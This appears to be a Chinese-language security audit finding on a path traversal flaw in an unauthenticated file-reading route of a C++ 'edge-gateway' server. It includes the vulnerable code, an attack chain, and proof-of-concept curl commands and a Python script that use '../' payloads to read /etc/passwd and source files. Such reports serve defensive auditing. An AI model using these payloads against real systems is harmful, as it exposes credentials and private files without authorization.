# VULN-DF-MAIN-002: GET /files 路由未校验路径参数，攻击者可通过目录遍历读取系统任意文件

**严重性**: High | **CWE**: CWE-22 (路径遍历) | **置信度**: 85/100
**位置**: `src/main.cpp:54-61` @ `lambda(GET /files)`

---

## 1. 漏洞细节

`/files` 路由处理函数从 HTTP 查询参数 `name` 中提取用户输入，并直接传递给 `FileCache::readTextFile()` 用于文件读取。整个数据流路径中**不存在任何路径校验或清洗机制**：

- **无路径规范化**：未使用 `realpath()` 或等效函数对最终路径进行规范化
- **无目录遍历过滤**：未检查 `../`、`..\\` 等遍历序列
- **无文件名白名单**：未限制允许访问的文件名范围
- **无基目录约束检查**：未验证解析后的路径是否仍在 `baseDir_`（"data"）范围内
- **无认证要求**：`/files` 路由不需要任何身份认证即可访问

`FileCache` 在 `main.cpp:31` 中以 `baseDir="data"` 构造，但 `readTextFile()` 仅做简单字符串拼接 `baseDir_ + "/" + name`。当 `name` 包含 `../../../etc/passwd` 时，最终路径为 `data/../../../etc/passwd`，操作系统将其解析为 `/etc/passwd`，从而实现任意文件读取。

`try/catch` 块（`main.cpp:57-61`）仅在文件打开失败时捕获异常并返回 404 错误，**不具备任何防御作用**——它不阻止遍历行为本身，只在目标文件不存在时处理错误。

## 2. 漏洞代码

**文件**: `src/main.cpp` (行 54-62)

```cpp
// src/main.cpp:54-62 — GET /files 路由处理
server.route("GET", "/files", [&](const HttpRequest& request) {
    std::string name = queryValue(request, "name");  // ← 第55行: SOURCE — 用户可控输入，无校验
    audit.event("anonymous", "read-file", name);      // ← 第56行: 仅记录审计日志，不做验证
    try {
      return text(200, files.readTextFile(name));     // ← 第58行: SINK — 污点数据传入 FileCache
    } catch (const std::exception& ex) {
      return text(404, std::string("error=") + ex.what() + "\n");  // 仅异常处理，非防御
    }
});
```

**文件**: `src/main.cpp` (行 13-16) — `queryValue()` 辅助函数

```cpp
// src/main.cpp:13-16 — 查询参数提取，无任何清洗
std::string queryValue(const HttpRequest& request, const std::string& key) {
  auto found = request.query.find(key);
  return found == request.query.end() ? "" : found->second;  // 直接返回原始值
}
```

**文件**: `src/file_cache.cpp` (行 10-19) — `readTextFile()` 文件读取

```cpp
// src/file_cache.cpp:10-19 — 文件读取，无路径校验
std::string FileCache::readTextFile(const std::string& name) const {
  std::ifstream file(baseDir_ + "/" + name);  // ← 第11行: 直接拼接，无规范化/过滤
  if (!file) {
    throw std::runtime_error("file not found");
  }

  std::ostringstream data;
  data << file.rdbuf();    // 读取完整文件内容
  return data.str();       // 返回给调用者（最终进入 HTTP 响应体）
}
```

**文件**: `src/http_server.cpp` (行 19-32) — `parseQuery()` 查询解析

```cpp
// src/http_server.cpp:19-32 — 查询参数解析，无 URL 解码，无输入校验
std::map<std::string, std::string> parseQuery(const std::string& query) {
  std::map<std::string, std::string> result;
  std::stringstream stream(query);
  std::string item;
  while (std::getline(stream, item, '&')) {
    auto pos = item.find('=');
    if (pos == std::string::npos) {
      result[item] = "";
    } else {
      result[item.substr(0, pos)] = item.substr(pos + 1);  // 原始值直接存储
    }
  }
  return result;
}
```

**代码分析**：从 HTTP 请求解析到文件打开的完整链路中，四个关键环节均未实施任何安全措施。`parseQuery()` 不做 URL 解码（但 `../` 在查询字符串中是合法字符，无需编码即可传输），`queryValue()` 直接返回原始值，路由处理函数不做校验，`readTextFile()` 直接拼接路径。

## 3. 完整攻击链路

```
[入口点] GET /files HTTP 请求 — 无认证，无中间件
↓ HTTP 请求到达服务器 socket
[请求解析] parseRequest()@src/http_server.cpp:42
↓ 分离 path="/files" 和 query="name=../../../etc/passwd"
[查询解析] parseQuery()@src/http_server.cpp:19
↓ 提取 name → "../../../etc/passwd"（原始字符串，无清洗）
[参数提取] queryValue(request, "name")@src/main.cpp:13
↓ 返回 request.query["name"] = "../../../etc/passwd"
[审计记录] audit.event("anonymous", "read-file", name)@src/main.cpp:56
↓ 仅记录日志，不阻断请求
[路由处理] lambda(GET /files)@src/main.cpp:54
↓ 调用 files.readTextFile(name)，name 为用户输入
[文件打开] ifstream file(baseDir_ + "/" + name)@src/file_cache.cpp:11
↓ 拼接路径: "data" + "/" + "../../../etc/passwd" = "data/../../../etc/passwd"
[路径解析] 操作系统将 "data/../../../etc/passwd" 规范化为 "/etc/passwd"
↓ 文件成功打开并读取
[数据返回] readTextFile() 返回文件内容 → text(200, content) → HTTP 响应体
↓ 攻击者获得 /etc/passwd 完整内容
```

**链路验证说明**：

1. **入口可达性**：`GET /files` 路由在 `main.cpp:54` 注册，`HttpServer::run()` 在 `http_server.cpp:120` 通过 `routeKey()` 匹配路由并直接调用处理函数，无认证中间件。
2. **数据传递完整性**：从 `parseQuery()` 到 `readTextFile()` 的每一步，`name` 变量均作为 `std::string` 值传递，未被修改、截断或清洗。
3. **Sink 触发**：`file_cache.cpp:11` 的 `std::ifstream file(baseDir_ + "/" + name)` 直接将拼接后的路径交给操作系统，操作系统的文件系统 API 会自动解析 `../` 遍历序列。

## 4. 攻击场景

**攻击者画像**: 远程未认证用户——任何能访问目标服务器 HTTP 端口的网络用户均可发起攻击，无需登录或任何凭据。

**攻击向量**: HTTP GET 请求，通过查询参数 `name` 注入目录遍历序列。

**利用难度**: **低**——仅需发送一个标准 HTTP GET 请求，无需特殊工具或复杂技术。

### 攻击步骤

1. **侦察**：确认目标服务器运行 edge-gateway 服务，确定监听端口（默认 8080）
2. **构造请求**：构建包含目录遍历 payload 的 GET 请求，例如 `GET /files?name=../../../etc/passwd`
3. **发送请求**：使用 curl、浏览器或任意 HTTP 客户端发送请求
4. **获取响应**：服务器返回 HTTP 200 响应，响应体中包含目标文件的完整内容
5. **扩展利用**：调整 `../` 的层数和目标文件路径，可读取系统上的任意文件（如 `/etc/shadow`、应用配置文件、源代码等）

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                     |
| ---------- | -------------- | ---------------------------------------------------------------------------------------- |
| 网络可达性 | 需要网络访问   | 攻击者需能访问 edge-gateway 监听的 TCP 端口（默认 8080），可通过 `argv[1]` 自定义端口    |
| 认证要求   | 无需认证       | `/files` 路由无任何认证检查，与 `/login` 路由不同，不要求有效 session token               |
| 配置依赖   | 无特殊配置     | 漏洞存在于默认代码路径中，无需特定配置选项触发                                           |
| 环境依赖   | 标准 Linux 环境 | 服务绑定 `INADDR_ANY`（`http_server.cpp:92`），监听所有网络接口；文件系统需有可读目标文件 |
| 时序条件   | 无时序依赖     | 漏洞为同步利用，不存在竞态条件                                                           |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                             |
| -------- | ---- | ------------------------------------------------------------------------------------------------ |
| 机密性   | **高** | 攻击者可读取进程权限范围内的任意文件，包括 `/etc/passwd`、`/etc/shadow`（若进程有权限）、应用配置文件、源代码、私钥等敏感数据 |
| 完整性   | 无   | 该漏洞仅允许文件读取（`ifstream` 为只读模式），不影响文件内容                                     |
| 可用性   | 低   | 大量请求可能导致磁盘 I/O 压力，但这不是主要威胁；若读取大文件可能导致内存消耗                      |

**影响范围**: 全局影响——攻击者可读取操作系统上进程有权限访问的任何文件。如果 edge-gateway 以 root 或高权限用户运行，影响范围覆盖整个文件系统。此外，泄露的配置文件或源代码可能暴露其他漏洞（如硬编码凭据、数据库连接字符串等），形成攻击链。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请在授权环境中使用。

### PoC 1: 使用 curl 读取 /etc/passwd

```bash
# 读取系统密码文件
curl -v "http://TARGET_HOST:8080/files?name=../../../etc/passwd"
```

**预期输出**:
```
HTTP/1.1 200 OK
Content-Type: text/plain
...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### PoC 2: 读取应用程序源代码（自引用攻击）

```bash
# 读取应用自身的源代码文件
curl "http://TARGET_HOST:8080/files?name=../src/main.cpp"
```

### PoC 3: Python 自动化扫描脚本

```python
#!/usr/bin/env python3
"""
路径遍历漏洞验证脚本 — 仅供安全测试使用
测试 edge-gateway /files 路由的目录遍历漏洞
"""
import requests
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

# 测试用例：常见敏感文件
sensitive_files = [
    ("../../../etc/passwd", "root:"),
    ("../../../etc/hostname", ""),
    ("../src/main.cpp", "#include"),
    ("../CMakeLists.txt", "cmake_minimum_required"),
]

print(f"[*] 目标: {target}")
print(f"[*] 测试路径遍历漏洞...\n")

for payload, expected in sensitive_files:
    url = f"{target}/files?name={payload}"
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200 and (not expected or expected in resp.text):
            print(f"[+] 漏洞确认! payload={payload}")
            print(f"    状态码: {resp.status_code}")
            print(f"    响应前100字符: {resp.text[:100]}")
        else:
            print(f"[-] 未触发: payload={payload} (status={resp.status_code})")
    except Exception as e:
        print(f"[!] 请求失败: {e}")
    print()
```

**使用说明**: 在授权测试环境中启动 edge-gateway 服务后，运行上述 curl 命令或 Python 脚本。如果返回 HTTP 200 且响应体包含目标文件内容，则漏洞存在。

**预期结果**: 服务器返回 HTTP 200 状态码，响应体中包含被请求文件的完整文本内容。若目标文件不存在或进程无权限读取，则返回 HTTP 404 及错误信息。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux（Ubuntu 20.04+ 或等效发行版）
- 编译器: GCC 9+ 或 Clang 10+（需支持 C++17）
- 构建工具: CMake 3.16+
- 依赖: 无外部依赖，仅使用 C++ 标准库和 POSIX socket API

### 构建步骤

```bash
# 克隆/获取源代码后
cd /path/to/project
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)
```

### 运行配置

```bash
# 创建 data 目录（FileCache 的 baseDir）
mkdir -p data
echo "test content" > data/sample.txt

# 启动服务（默认端口 8080）
./edge-gateway

# 或指定自定义端口
./edge-gateway 9090
```

### 验证步骤

1. 启动 edge-gateway 服务：`./edge-gateway 8080`
2. 在另一终端执行正常请求验证服务可用：`curl http://localhost:8080/files?name=sample.txt`，预期返回 "test content"
3. 发送路径遍历 payload：`curl "http://localhost:8080/files?name=../../../etc/passwd"`
4. 观察返回内容是否包含 `/etc/passwd` 文件内容

### 预期结果

- **步骤 2**: 返回 HTTP 200，响应体为 "test content"（正常功能验证）
- **步骤 3**: 返回 HTTP 200，响应体包含 `/etc/passwd` 的完整内容（如 `root:x:0:0:root:/root:/bin/bash` 等），确认路径遍历漏洞存在
- **对比**: 如果漏洞已修复，步骤 3 应返回 HTTP 400/403 或仅允许访问 `data/` 目录内的文件
